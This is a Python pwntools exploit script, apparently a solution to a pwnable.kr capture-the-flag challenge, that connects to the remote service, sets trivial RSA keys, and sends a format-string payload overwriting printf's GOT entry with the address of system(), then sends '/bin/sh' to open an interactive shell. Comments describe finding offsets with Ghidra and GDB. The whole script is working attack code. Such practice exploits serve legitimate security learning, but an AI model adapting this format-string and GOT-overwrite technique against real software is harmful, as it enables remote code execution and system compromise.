from pwn import *

conn = remote('pwnable.kr', 9012)

# Set a key pair first. What we use exactly as a key is not relevant to the
# exploit, as long as it's a valid key.
conn.sendline(b'1')
conn.sendline(b'11')
conn.sendline(b'29')
conn.sendline(b'1')
conn.sendline(b'1')

# Basically these e, d exponents mean there's no encryption, only the
# encoding. We'll need to be able to encode stuff here too:
def encode(b):
    return b''.join(binascii.hexlify(struct.pack('<I', c)) for c in b)

# The address of printf()
# This is easy to find using Ghidra (https://i.imgur.com/JrQQjfW.png)
printf_addr = 0x602028
system_addr = 0x4007c0

# Format string payload.
#
# Good explanation for the useful format parameters by OWASP:
#     https://owasp.org/www-community/attacks/Format_string_attack
#
# I printed some %x %x %x values first and then used GDB to find
# out the right offsets.
payload = encode(b'%34$n%' + bytes(str(system_addr), encoding='utf-8') + b'x%33$n') + 16*b'x' + p64(printf_addr) + p64(printf_addr + 4)

# Select decryption operation
conn.sendline(b'3')
conn.sendline(b'1024')
conn.sendline(payload)
conn.recvuntil(b'- decrypted result -\n')
data = conn.recvline()

# Now, send /bin/sh, and fingers crossed the system() function gets called.
conn.sendline(b'3')
conn.sendline(b'1024')
conn.sendline(encode(b'/bin/sh\x00'))
conn.recvuntil(b'- decrypted result -\n')

# Encryption of /bin/sh using this
conn.interactive(prompt='$ ')

